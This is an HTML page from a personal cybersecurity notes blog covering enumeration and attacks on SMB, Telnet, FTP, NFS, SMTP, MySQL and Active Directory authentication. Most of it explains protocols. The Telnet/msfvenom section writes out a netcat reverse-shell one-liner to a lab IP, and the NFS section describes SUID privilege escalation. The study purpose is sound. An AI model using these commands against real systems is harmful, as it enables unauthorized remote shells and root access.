@@ -1,0 +1,558 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head><script src="/rainou/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=rainou/livereload" data-no-instant defer></script>
+  <title>
+  Network Server Services · Rain Notes
+</title>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="color-scheme" content="light dark">
+
+
+
+
+<meta name="author" content="Rain Ou">
+<meta name="description" content="
+  Network services
+  
+    
+    Link to heading
+  
+
+
+  SMB
+  
+    
+    Link to heading
+  
+
+
+
+Enum4Linux, tools to extract from smb server on both windows and linux
+
+
+Command Usage: enum4linux [options] ip
+-U get userlist
+-M get machine list
+-N  get namelist dump (different from -U and -M)
+-S get sharelist
+-P get password policy information
+-G get group and member list
+-a all of the above (full basic enumeration)">
+<meta name="keywords" content="notes,cybersecurity,music,share">
+
+
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Network Server Services">
+  <meta name="twitter:description" content="Network services Link to heading SMB Link to heading Enum4Linux, tools to extract from smb server on both windows and linux
+Command Usage: enum4linux [options] ip -U get userlist -M get machine list -N get namelist dump (different from -U and -M) -S get sharelist -P get password policy information -G get group and member list -a all of the above (full basic enumeration)">
+
+<meta property="og:url" content="http://localhost:1313/rainou/cyber/network-server-services/">
+  <meta property="og:site_name" content="Rain Notes">
+  <meta property="og:title" content="Network Server Services">
+  <meta property="og:description" content="Network services Link to heading SMB Link to heading Enum4Linux, tools to extract from smb server on both windows and linux
+Command Usage: enum4linux [options] ip -U get userlist -M get machine list -N get namelist dump (different from -U and -M) -S get sharelist -P get password policy information -G get group and member list -a all of the above (full basic enumeration)">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="cyber">
+
+
+
+
+<link rel="canonical" href="http://localhost:1313/rainou/cyber/network-server-services/">
+
+
+<link rel="preload" href="/fonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin>
+
+
+  
+  
+  <link rel="stylesheet" href="/rainou/css/coder.css" media="screen">
+
+
+
+
+
+
+  
+    
+    
+    <link rel="stylesheet" href="/rainou/css/coder-dark.css" media="screen">
+  
+
+
+
+ 
+
+
+
+
+<link rel="icon" type="image/svg+xml" href="/img/favicon.svg" sizes="any">
+<link rel="icon" type="image/png" href="/img/favicon-32x32.png" sizes="32x32">
+<link rel="icon" type="image/png" href="/img/favicon-16x16.png" sizes="16x16">
+
+<link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
+<link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="manifest" href="/site.webmanifest">
+<link rel="mask-icon" href="/images/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+
+
+
+
+
+
+</head>
+
+
+
+
+
+
+<body class="preload-transitions colorscheme-auto">
+  
+<div class="float-container">
+    <a id="dark-mode-toggle" class="colorscheme-toggle">
+        <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+    </a>
+</div>
+
+
+  <main class="wrapper">
+    <nav class="navigation">
+  <section class="container">
+    
+    <a class="navigation-title" href="http://localhost:1313/rainou/">
+      Rain Notes
+    </a>
+    
+    
+      <input type="checkbox" id="menu-toggle" />
+      <label class="menu-button float-right" for="menu-toggle">
+        <i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i>
+      </label>
+      <ul class="navigation-list">
+        
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/rainou/cyber/">Cyber</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/rainou/music/">Music</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/rainou/about/">About</a>
+            </li>
+          
+        
+        
+      </ul>
+    
+  </section>
+</nav>
+
+
+    <div class="content">
+      
+  <section class="container page">
+  <article>
+    <header>
+      <h1 class="title">
+        <a class="title-link" href="http://localhost:1313/rainou/cyber/network-server-services/">
+          Network Server Services
+        </a>
+      </h1>
+    </header>
+
+    <h1 id="network-services">
+  Network services
+  <a class="heading-link" href="#network-services">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<h2 id="smb">
+  SMB
+  <a class="heading-link" href="#smb">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<ul>
+<li>
+<p><a href="https://github.com/CiscoCXSecurity/enum4linux"  class="external-link" target="_blank" rel="noopener">Enum4Linux</a>, tools to extract from smb server on both windows and linux</p>
+</li>
+<li>
+<p>Command Usage: <code>enum4linux [options] ip</code>
+<code>-U</code> get userlist
+<code>-M</code> get machine list
+<code>-N </code> get namelist dump (different from -U and -M)
+<code>-S</code> get sharelist
+<code>-P</code> get password policy information
+<code>-G</code> get group and member list
+<code>-a</code> all of the above (full basic enumeration)</p>
+</li>
+<li>
+<p>Access the <code>smbclient //[IP]/[SHARE]</code>
+<code>-U [name]</code> : to specify the user
+<code>-p [port]</code> : to specify the port</p>
+</li>
+</ul>
+<h2 id="telnet">
+  Telnet
+  <a class="heading-link" href="#telnet">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<h2 id="smfvenon">
+  smfvenon
+  <a class="heading-link" href="#smfvenon">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<ul>
+<li>Can be used to connect via telnet</li>
+<li><strong>mkfifo</strong>: generate payload: <code>msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R</code>
+<ul>
+<li>Listen to the port with <code>nc -lvp 4444</code></li>
+<li>Send the generated payload to the shell <code>mkfifo /tmp/peqgmh; nc 10.10.15.142 4444 0&lt;/tmp/peqgmh | /bin/sh &gt;/tmp/peqgmh 2&gt;&amp;1; rm /tmp/peqgmh'</code></li>
+<li>The response will be send to the 4444 port</li>
+</ul>
+</li>
+</ul>
+<h2 id="ftp">
+  FTP
+  <a class="heading-link" href="#ftp">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<ul>
+<li>connect command <code>ftp [IP]</code></li>
+<li>has port 20 and 21</li>
+<li>one for command communitation, the other for data transportation</li>
+<li>FTP can be passive and active,
+<ul>
+<li>active: data server reached out to the client port</li>
+<li>passive: server listen to their local port</li>
+</ul>
+</li>
+<li><a href="https://www.exploit-db.com/exploits/20745"  class="external-link" target="_blank" rel="noopener">For some server, FTP&rsquo;s in.ftpd enumeration exploit</a></li>
+<li><a href="https://www.jscape.com/blog/countering-packet-sniffers-using-encrypted-ftp"  class="external-link" target="_blank" rel="noopener">Man-in-the-middle attack using ARP poisoning</a></li>
+</ul>
+<h2 id="nfs">
+  NFS
+  <a class="heading-link" href="#nfs">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<ul>
+<li>NFS can be used to transfer files between different operating systems, each of the computer can act as NFS file server to any other computer.
+<a href="https://docs.oracle.com/cd/E19683-01/816-4882/6mb2ipq7l/index.html"  class="external-link" target="_blank" rel="noopener">How the NFS Service Works</a></li>
+<li>In simple term, NFS is mounting a remote directory on the local system like a hard disk.</li>
+<li>Mounting service will use this to connect to the relevant mount daemon using RPC. (Use RPC to communicate between devices)</li>
+<li>Steps:
+<ul>
+<li>First checks the directory permission for whatever requested</li>
+<li>RPC call is placed to NFSD when someone wants to access a file using NFSD. Which the daemon has the following information (these are used to control to verify file permission)
+<ul>
+<li>The file handle</li>
+<li>The name of the file to be accessed</li>
+<li>The user&rsquo;s, user ID</li>
+<li>The user&rsquo;s group ID</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Required package for NFS service: NFS-Common
+<ul>
+<li>Program includes:
+<ul>
+<li>lockd</li>
+<li>statd</li>
+<li><strong>showmount</strong></li>
+<li>nfsstat</li>
+<li>gssd</li>
+<li>idmapd</li>
+<li><strong>mount.nfs</strong></li>
+</ul>
+</li>
+<li><a href="https://packages.ubuntu.com/jammy/nfs-common"  class="external-link" target="_blank" rel="noopener">More information about this package</a></li>
+</ul>
+</li>
+<li>Port displayed as <code>nfs_acl</code></li>
+<li>Example mounting NFS command
+<ul>
+<li><code>sudo mount -t nfs IP:share /tmp/mount/ -nolock</code></li>
+<li><code>sudo</code>: Run as root</li>
+<li><code>mount</code>: Execute the mount command</li>
+<li><code>-t nfs</code>Type of device to mount, then specifying that it&rsquo;s NFS</li>
+<li><code>IP:share</code>: The IP Address of the NFS server, and the name of the share we wish to mount</li>
+<li><code>-nolock</code> Specifies not to use NLM locking</li>
+</ul>
+</li>
+<li>More Reading
+<ul>
+<li><a href="https://www.datto.com/blog/what-is-nfs-file-share"  class="external-link" target="_blank" rel="noopener">What is Network File System (NFS) File Share?</a></li>
+<li><a href="https://nfs.sourceforge.net/"  class="external-link" target="_blank" rel="noopener">Linux NFS Overview, FAQ and HOWTO Documents</a></li>
+<li><a href="https://wiki.archlinux.org/title/NFS"  class="external-link" target="_blank" rel="noopener">NFS on Arch</a></li>
+</ul>
+</li>
+</ul>
+<h3 id="nfs-configuration">
+  NFS configuration
+  <a class="heading-link" href="#nfs-configuration">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<ul>
+<li>File with <code>SUID</code> bit set means that the <strong>file can be run</strong> with the permission of the file(s) owner/group
+<ul>
+<li>If this bit is on, (s instad of x in the permission) then this file will be run as root permission by all user</li>
+</ul>
+</li>
+<li><code>root_squash</code> is an NFS configuration that prevents outside user to be able to access the root priviledge. Automatically assign user to &ldquo;nfsnobody&rdquo;. If this is not set properly, then it alow the user the creation of SUID bit files.</li>
+<li>Possible scenario if <code>root_squash</code> is off
+<ul>
+<li>Ubuntu Server 18.04 bash executable: <code>https://github.com/polo-sec/writing/blob/master/Security%20Challenge%20Walkthroughs/Networks%202/bash</code></li>
+<li>upload files to the NFS share and change the permission to S bit</li>
+<li>run this bash shell as root, completion of escalate privileges</li>
+</ul>
+</li>
+</ul>
+<h2 id="smtp">
+  SMTP
+  <a class="heading-link" href="#smtp">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<ul>
+<li>The mail service comprising of two services
+<ul>
+<li>SMTP: A protocol that deliver the mail to the destination
+<ul>
+<li>It verifies who is sending emails through the SMTP server.</li>
+<li>It sends the outgoing mail</li>
+<li>If the outgoing mail can&rsquo;t be delivered it sends the message back to the sender</li>
+</ul>
+</li>
+<li>POP/IMAP: A protocol that control the retriving processes for the receiver
+<ul>
+<li>POP: Receiver uses POP protocol to &ldquo;retrieve&rdquo; email from POP server</li>
+<li>IMAP: Receiver uses IMAP to &ldquo;synchronize&rdquo; email with the IMAP server
+<img src="1.png" alt="Relationship between SMTP and POP/IMAP"></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Simplify version on how it work:
+<ol>
+<li>User initiate SMTP handshake with SMTP port (25)</li>
+<li>User send email to SMTP server</li>
+<li>SMTP server checks if the domain name of the recipient and the sender is the same (check if sending to itself)</li>
+<li>The sender&rsquo;s SMTP server connect to the recipient SMTP server. Relay the emails if recipient&rsquo;s SMTP server is online, otherwise, the Email gets put into an SMTP queue (periodicly resend)</li>
+<li>The recipient&rsquo;s SMTP server verify the validity of domain and user name. Then forward to the recipient POP/IMAP</li>
+<li>The E-Mail will then show up in the recipient&rsquo;s inbox.</li>
+</ol>
+</li>
+<li><a href="https://computer.howstuffworks.com/e-mail-messaging/email3.htm"  class="external-link" target="_blank" rel="noopener">How Email Works</a></li>
+<li><a href="https://www.afternerd.com/blog/smtp/"  class="external-link" target="_blank" rel="noopener">SMTP protocol explaned</a></li>
+</ul>
+<h3 id="enumeration">
+  Enumeration
+  <a class="heading-link" href="#enumeration">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<ul>
+<li><strong>Enumerating Server details</strong>: Metasploit: <code>smtp_version</code> scan the version of the smtp</li>
+<li><strong>Enumerating Users</strong>:
+<ul>
+<li><code>VRFY</code>: confirming the name</li>
+<li><code>EXPN</code>: actual address of user’s aliases and lists of e-mail</li>
+</ul>
+</li>
+<li>Enumeration is doable via telnet, but metasploit&rsquo;s module <code>smtp_enum</code> is more efficient witha a wordlist</li>
+<li>There are other tools such as &ldquo;smtp-user-enum&rdquo; which works better on Solaris</li>
+<li>Enumeration is performed by inspecting the responses to VRFY, EXPN, and RCPT TO commands</li>
+<li>The technique could work aganst other vulnerable SMTP daemons</li>
+</ul>
+<h2 id="mysql">
+  MySQL
+  <a class="heading-link" href="#mysql">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p><a href="https://dev.mysql.com/doc/dev/mysql-server/latest/PAGE_SQL_EXECUTION.html"  class="external-link" target="_blank" rel="noopener">SQL Query Execution</a>
+<a href="https://www.w3schools.com/php/php_mysql_intro.asp"  class="external-link" target="_blank" rel="noopener">PHP MySQL Database</a></p>
+<ul>
+<li>Im mySQL, <strong>schema</strong> is synonymous with a database. While in other database, schema only represent a part of the database
+<ul>
+<li>e.g. <code>CREATE SCHEMA</code> instead of <code>CREATE DATABASE</code></li>
+</ul>
+</li>
+<li>Hash can be used in an different way in mySQL, each hash has a unique ID that serves as a pointer to the original data</li>
+<li>Related metasploit module
+<ul>
+<li><code>mysql_sql</code>, <code>mysql_schemadump</code>, <code>mysql_hashdump</code></li>
+</ul>
+</li>
+</ul>
+<h1 id="adds">
+  ADDS
+  <a class="heading-link" href="#adds">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<ul>
+<li>Active Domain Directory Services</li>
+<li>Machine naming Scheme: <code>DC01</code> will have account name <code>DC01$</code></li>
+</ul>
+<h2 id="group-policy-management">
+  Group Policy Management
+  <a class="heading-link" href="#group-policy-management">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<ul>
+<li>Every GPO (group policy object) is linked to a OU (Organizational Unit) and applied to linked OU and Every sub-OU under it
+<img src="2.png" alt="Sales OU will still be affected by the Default Domain Policy"></li>
+<li>Every GPO can apply to a group of user or computer through security filtering</li>
+<li>GPO has configurations that can apply to computers only and configurations that can apply to users only. (user and computer each as a section per GPO)</li>
+<li>Any policy changes are made via Group Policity Management Editor by right click edit on the GPO
+*Note that the configuration made for user will be ignored by the computer, the reverse is also true.</li>
+</ul>
+<h2 id="gpo-distribution">
+  GPO distribution
+  <a class="heading-link" href="#gpo-distribution">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<ul>
+<li>GPOs are distributed to the DC network via a network share called <code>SYSVOL</code> which is stored in the DC.</li>
+<li>Share point on DC by defauly <code>C:\Windows\SYSVOL\sysvol\</code></li>
+<li>Usually require 2h for DC to sync GPO, but can manually force via command <code>gpupdate /force</code></li>
+</ul>
+<h2 id="authentication">
+  Authentication
+  <a class="heading-link" href="#authentication">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>Protocol used for network authentication in Windows domain
+<strong>NetNTLM</strong>: Legacy authentication
+<strong>Kerberos</strong>: Used by the recent version</p>
+<h3 id="kerberos-authentication">
+  Kerberos Authentication
+  <a class="heading-link" href="#kerberos-authentication">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<p>The whole thing is build upon no need to send the authentication information everything when accessing network services
+Step One: Granting TGT (allow the user to request services on the network)
+<img src="3.png" alt="Client Acquiring Ticket Granting Ticket (TGT) via Key Distribution Center (KDC)">
+Step Two: Use TGT to acquire services ticket
+<img src="4.png" alt="Client acquiring Ticket Granting Service (TGS) using TGT and Service Principal Name (SPN), Service Session Key (SVC) is used to authenticate into services">
+Step Three:
+<img src="5.png" alt="Authenticate and establish a connection, KDC validate the Session Key"></p>
+<h3 id="netntlm-authentication">
+  NetNTLM Authentication
+  <a class="heading-link" href="#netntlm-authentication">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<p><img src="6.png" alt="Legacy Authentiation Protocol: Client uses the challenge to create hash and compare the result with DC&rsquo;s generated hash (user + Challenge) to authenticate"></p>
+
+  </article>
+</section>
+
+  
+
+    </div>
+
+    <footer class="footer">
+  <section class="container">
+    ©
+    
+      2025 -
+    
+    2026
+     Rain Ou 
+    ·
+    
+    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder</a>.
+    
+  </section>
+</footer>
+
+  </main>
+
+  
+
+  
+  
+  <script src="/rainou/js/coder.js"></script>
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+</body>
+</html>
